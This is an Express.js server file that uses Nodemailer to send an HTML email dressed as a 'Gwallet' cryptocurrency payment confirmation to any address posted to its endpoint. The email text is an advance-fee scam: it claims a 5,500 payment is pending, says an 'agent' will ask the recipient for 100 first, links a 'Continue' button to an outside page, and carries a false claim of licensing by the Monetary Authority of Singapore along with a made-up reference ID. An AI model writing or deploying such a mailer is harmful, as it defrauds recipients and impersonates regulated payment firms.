const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000; // Render provides the PORT environment variable

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files from React/Vue/HTML frontend if you have one
app.use(express.static(path.join(__dirname, 'public')));

// API Routes
app.get('/api/data', (req, res) => {
    res.json({ message: 'Hello from Render server!' });
});

// API endpoint to send email
app.post('/api/data', (req, res) => {
  const { to, name } = req.body; // Get recipient email from frontend

  // Validate email
  if (!to || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(to)) {
    return res.status(400).json({ error: 'Invalid email address' });
  }

    // Sanitize name; use default if not provided
  const sanitizedName = name && name.trim() ? name.trim() : 'Subscriber';

// Nodemailer transporter configuration
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER, 
    pass: process.env.EMAIL_PASS 
  },
});

  // Email options
  const mailOptions = {
    from: `"Gwallet" <${process.env.EMAIL_USER}>`,
    to: to, // Recipient email from frontend
    subject: 'Transaction confirmed (Ref ID - TY-U-753194873159)',
    text: `Hello ${sanitizedName}!\n\nThank you for subscribing! This email contains updates and images in HTML format, but your email client is displaying the plain-text version. Visit our website for more information: https://x.com`,
    html: `
  <div style="text-align: center; background-color: #f1f7f7; max-width: 500px; margin: 0 auto; padding: 20px;">
          <img src="https://cdn.pixabay.com/photo/2021/04/30/16/47/btc-logo-6219386_1280.png" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
          <h1 style="font-size: 32px;">Payment to ${sanitizedName}</h1>
          <p>PENDING<br>We adding an 100 to your payment, agent is going to request 100 from you, as soon as you pay it, you receive the 5,500 and avoid further pending transactions.</p>
          <a href="https://millxore.github.io/seen/" style="display: inline-block; color: #ffffff; padding: 15px 40px; background-color: #f7b611; color: white; text-decoration: none; border-radius: 20px; font-size: 16px; margin: 10px 0; font-weight: bold;">Continue</a>
      </div>
      <div style="background-color: #f1f7f7; max-width: 500px; padding: 20px;">
          <div style="text-align: center;">
              <hr style="margin: 30px auto; border: 1px solid #D3D3D3;">
          </div>
          <div style="text-align: center;">
              <p style="width: 30px; height: 30px; border-radius: 50%; display: inline-block; font-size: 12px; background-color: #f7b611; padding: 0 8px; border: 2px solid white;"></p>
              <p style="width: 30px; height: 30px; border-radius: 50%; display: inline-block; font-size: 12px; background-color: #f7b611; padding: 0 8px; border: 2px solid white;"></p>
              <p style="width: 30px; height: 30px; border-radius: 50%; display: inline-block; font-size: 12px; background-color: #f7b611; padding: 0 8px; border: 2px solid white;"></p>
          </div>
          <p style="color: #555; font-size: 14px;">
              For more info, visit our website!
          </p>
          <p style="color: #555; font-size: 14px;">
              Copyright © 1999-2025. All rights reserved. 
          </p>
          <p style="color: #555; font-size: 14px;">
              Rts. Ltd. is licensed by the Monetary Authority of Singapore as a Major Payment Institution under the Payment Services Act 2019.  
          </p>
      </div>
`
  };

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).json({ error: 'Failed to send email' });
    }
    console.log('Email sent:', info.response);
    res.status(200).json({ message: 'Email sent successfully' });
  });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
